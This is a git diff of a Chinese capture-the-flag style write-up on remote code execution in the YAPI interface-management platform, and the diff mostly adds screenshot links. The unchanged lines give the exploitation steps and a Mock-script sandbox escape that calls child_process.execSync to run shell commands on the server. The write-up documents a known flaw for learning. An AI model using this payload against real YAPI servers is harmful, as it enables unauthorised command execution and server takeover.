@@ -8,8 +8,8 @@ YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项�
 ## 利用流程
 1.访问地址：118.193.36.37:39888     注册一个新用户
 
-![image]()
-![image]()
+![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.jpg)
+![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.jpg)
 2.添加项目 -> 项目名字(随意) ->  创建项目 -> 高级Mock -> 开启 -> Mock脚本
 ```
 const sandbox = this
@@ -20,10 +20,13 @@ const process = myfun()
 mockJson = process.mainModule.require("child_process").execSync("ls /tmp").toString()
 ```
 
-![image]()
+![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.jpg)
+![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.jpg)
+![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.jpg)
+![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/6.jpg)
 4.预览 查看Mock地址 并访问
 
-![image]()
+![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/7.jpg)
 5.得到flag
 
-![image]()
+![image](https://github.com/LiuYuH-hash/WriteUp/blob/main/yapi%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/8.jpg)
